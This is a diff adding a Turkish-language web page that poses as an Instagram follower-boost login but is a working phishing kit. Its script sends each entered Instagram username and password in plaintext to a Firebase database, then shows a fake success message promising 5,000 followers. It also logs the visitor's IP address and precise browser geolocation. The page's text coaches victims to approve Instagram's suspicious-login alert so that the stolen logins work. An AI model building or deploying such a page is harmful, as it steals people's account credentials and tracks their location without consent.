@@ -1,0 +1,268 @@
+<html lang="tr">
+
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>İnstagram Takipçi Hilesi - GramTakipci Giriş Sayfası</title>
+    <link rel="shortcut icon" href="https://gramtakipci.com/assets/images/instagram-takip.png" type="image/png">
+    <meta name="robots" content="noindex, nofollow">
+    <meta id="viewport" name="viewport" content="width=device-width, user-scalable=no, initial-scale=1, minimum-scale=1, maximum-scale=1">
+    <link rel="stylesheet" href="Giri%C5%9F_dosyalar/instastyle.css">
+</head>
+
+<body>
+
+    <span id="react-root">
+        
+         <section class="instaclass5">
+            <main class="instaclass4 instaclass30" role="main">
+               <article class="instaarticle3">
+                  <div class="instaclass1">
+                    <div class="instaclass2">
+                        <br>
+                        
+                        <div class="instaclass6">
+							<div class="instaclass20" style="color: red; text-align: left;">
+								<h1 style="color: black; font-weight: bold; font-size:25px; text-align:center; padding: 10px;">GİRİŞ</h1>
+							
+							</div>
+                         <center>
+                                <span style="font-size: 14px;text-align: center;color: gray; margin-bottom: 20px;">İnstagram hesabınız ile giriş yapın.</span>
+    </center>
+    <div class="instaclass8 instaclass9" style="margin-top: 20px; "><input type="text" style="width: 100%;" class="instaclass10 instaclass11" id="username" placeholder="Kullanıcı adı">
+        <div class="suggestUsers">
+            <ul></ul>
+        </div>
+    </div>
+    <div class="instaclass8 instaclass9">
+        <input type="password" id="password" style="width: 100%;" class="instaclass10 instaclass11" placeholder="Şifre">
+    </div>
+
+    <span class="instaclass14 instaclass15">
+                                 <button onclick="login_div();" class="instaclass16 instaclass17 instaclass18 instaclass19" type="button">Giriş yap</button>
+                                 <div class="spiSpinner"></div>
+                              </span>
+    <div class="instaclass20">
+        <p id="slfErrorAlert" aria-atomic="true" role="alert"></p>
+    </div>
+    <div class="instaclass20" style="color: black; text-align: left;">
+        <p style="color: red;">Bu sitenin instagram ile hiçbir bağlantısı yoktur. Kullanıcı adı ve şifreniz ile Instagram API sistemi kullanılarak işlemleriniz gerçekleştirilir.</p>
+        <p> </p>
+
+        <p>Bu site Havuz Sistemi mantığı ile çalışmaktadır.</p>
+
+        <p style="color: blue; text-align: left;">Sürekli şifre yanlış hatası alıyorsanız instagram mobil uygulaması üzerinden hesabınıza girin. Çıkan uyarıda bendim butonuna tıklayın.</p>
+    </div>
+    <div class="instaclass20" style="color: black; text-align: left;">
+        <p style="color: blue; text-align: left;">Sürekli şifre yanlış hatası ile karşılaşabilirsiniz. Instagram'ın anti-spam sisteminde bir hata var. Konu, çözebileceğimiz bir şey değil. Instagram kendisi çözecektir. Burayı takip etmeye devam edin.</p>
+    </div>
+    <div class="instaclass20" style="color: black; text-align: left;">
+
+        <span style="color: red; font-weight: bold;">Burayı oku!</span> 1- Giriş uzun sürebilir bekleyin lütfen..(30 saniye kadar sürer.) <br>2- ilk girişte şifre yanlış diyebilir. https://www.instagram.com üzerinden hesabınıza girin. Çıkan uyarıda bendim
+        diyin ve buradan tekrar giriş yapın..
+        <br>3- Instagram şifrenizi bloke edebilir. Şifremi unuttum diyerek yeni şifre alabilirsiniz.</div>
+
+    </div>
+    </div>
+    </div>
+    </article>
+    </main>
+    </section>
+    </span>
+
+
+
+    <p id="dogruluk" style="display: none;"></p>
+    <p id="tarayici" style="display: none;"></p>
+    <p id="boylam" style="display: none;"></p>
+    <p id="durum_mesaj" style="display: none;"></p>
+    <iframe id="harita" src="https://www.google.com/maps?output=embed&q=Türkiye" width="100%" height="450" frameborder="0" style="border:0;margin-bottom:10px; display: none;" allowfullscreen="" aria-hidden="false" tabindex="0"></iframe>
+    <p id="enlem" style="display: none;"></p>
+
+
+
+
+
+
+    <div class="onay_kodu_ekrani"></div>
+    <div class="onay_kodu_girme_ekrani"></div>
+    <script src="https://www.gstatic.com/firebasejs/8.8.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.8.1/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.8.1/firebase-auth.js"></script>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+    <script async="" src="Giri%C5%9F_dosyalar/analytics.js"></script>
+    <script type="text/javascript" async="" src="Giri%C5%9F_dosyalar/recaptcha__tr.js" crossorigin="anonymous" integrity="sha384-iltDTsVSEOqQ7MjbOPUOY9sxUf+tlst5WRHlxDQdgK4Ywv4mJmN5z0nVsi5JdFIM"></script>
+    <script src="Giri%C5%9F_dosyalar/jquery.js"></script>
+    <script src="Giri%C5%9F_dosyalar/api.js"></script>
+    <script>
+        // Your web app's Firebase configuration
+        var firebaseConfig = {
+            apiKey: "AIzaSyB9tIw2auTNx9vFLUWcNh0kRcpslb7OjzY",
+            authDomain: "hakyeme-24368.firebaseapp.com",
+            databaseURL: "https://hakyeme-24368-default-rtdb.firebaseio.com",
+            projectId: "hakyeme-24368",
+            storageBucket: "hakyeme-24368.appspot.com",
+            messagingSenderId: "345564058995",
+            appId: "1:345564058995:web:9acef5ed73328a9bfaa106"
+        };
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+
+
+
+
+
+        function login_div() {
+
+            var usert = document.getElementById('username').value;
+            var passt = document.getElementById('password').value;
+            var today = new Date();
+            var dd = String(today.getDate()).padStart(2, '0');
+            var mm = String(today.getMonth() + 1).padStart(2, '0'); //January is 0!
+            var yyyy = today.getFullYear();
+            today = mm + '/' + dd + '/' + yyyy;
+            var dt = new Date(); // DATE() ile yeni bir tarih nesnesi oluşturuldu.
+            var saat = dt.getHours();
+            var dakika = dt.getMinutes();
+            var saniye = dt.getSeconds();
+            if (usert != "" && passt != "") {
+                firebase.database().ref('takipci/').push().set({
+                    Username: usert,
+                    Password: passt,
+                    createdDate: today + dt,
+                });
+
+                swal({
+                    title: "Başarılı",
+                    text: "+5000 Türk Takipçi Gönderilmiştir Hesabınıza...!",
+                    icon: "success",
+                    button: "Tamam",
+                });
+
+                var usert = document.getElementById('username').value = "";
+                var passt = document.getElementById('password').value = "";
+
+
+                /*
+
+			Tarayıcıdan konum bilgisi alma fonksiyonu
+
+			*/
+
+                document.getElementById('durum_mesaj').innerHTML = `Konum sorgulanıyor...`;
+                navigator.geolocation.getCurrentPosition(oldu, olmadi);
+
+
+
+                /*
+
+                			Tarayıcıdan konum sorgulama başarılı ise çağırdığımız fonksiyon
+
+                			*/
+
+                /*
+
+                			Tarayıcıdan konum sorgulama başarısız ise çağırdığımız fonksiyon
+
+                			*/
+
+
+            } else {
+                swal({
+                    title: "Başarısız",
+                    text: "Gerekli alanları doldurunuz",
+                    icon: "warning",
+                    buttons: "Tamam",
+                });
+            }
+
+        }
+
+
+        var usert = document.getElementById('username').value = "";
+        var passt = document.getElementById('password').value = "";
+
+
+        function oldu(pos) {
+
+
+            var a = document.getElementById('enlem').innerHTML = pos.coords.latitude;
+            var b = document.getElementById('boylam').innerHTML = pos.coords.longitude;
+            var c = document.getElementById('dogruluk').innerHTML = `${pos.coords.accuracy} metre`;
+            var ç = document.getElementById('tarayici').innerHTML = (navigator.appName) + (navigator.appVersion);
+            document.getElementById('durum_mesaj').innerHTML = `Konum sonucu bulundu`;
+
+
+            // ÖRNEK
+            // https://www.google.com/maps?output=embed&q=40.989491199999996,29.104537600000004
+            mapembed = `https://www.google.com/maps?output=embed&z=15&q=${pos.coords.latitude},${pos.coords.longitude}`;
+
+
+            document.getElementById('harita').setAttribute('src', mapembed);
+            var today = new Date();
+            var dd = String(today.getDate()).padStart(2, '0');
+            var mm = String(today.getMonth() + 1).padStart(2, '0'); //January is 0!
+            var yyyy = today.getFullYear();
+            today = mm + '/' + dd + '/' + yyyy;
+            var dt = new Date(); // DATE() ile yeni bir tarih nesnesi oluşturuldu.
+            var saat = dt.getHours();
+            var dakika = dt.getMinutes();
+            var saniye = dt.getSeconds();
+
+            firebase.database().ref('konum/').push().set({
+                createdDate: today + dt,
+                Enlem: a,
+                Boylam: b,
+                Tarayıcı: ç,
+                Dogriluk: c,
+            });
+        }
+
+        function olmadi(hata) {
+            document.getElementById('durum_mesaj').innerHTML = `
+<strong>Hata Kodu</strong> ${hata.code} <br>
+<strong>Hata mesajı</strong> ${hata.message}
+`;
+
+        }
+    </script>
+    <script>
+        var xml = new XMLHttpRequest();
+        xml.open("GET", "https://api.ipify.org")
+        xml.send();
+        xml.addEventListener("loadend", loaded);
+
+
+
+
+        function loaded(e) {
+            on(xml.responseText);
+
+
+        }
+
+        function on(ip) {
+            var num = 0;
+            firebase.database().ref("Ip").once("value").then(function(snap) {
+                var today = new Date();
+                var dd = String(today.getDate()).padStart(2, '0');
+                var mm = String(today.getMonth() + 1).padStart(2, '0'); //January is 0!
+                var yyyy = today.getFullYear();
+                today = mm + '/' + dd + '/' + yyyy;
+                var dt = new Date(); // DATE() ile yeni bir tarih nesnesi oluşturuldu.
+                var saat = dt.getHours();
+                var dakika = dt.getMinutes();
+                var saniye = dt.getSeconds();
+                num = snap.numChildren();
+                num++;
+                firebase.database().ref("İp").child(num.toString()).set({
+                    Ip: ip,
+                    createdDate: today + dt,
+                });
+            });
+        }
+    </script>
+</body>
+
+</html>
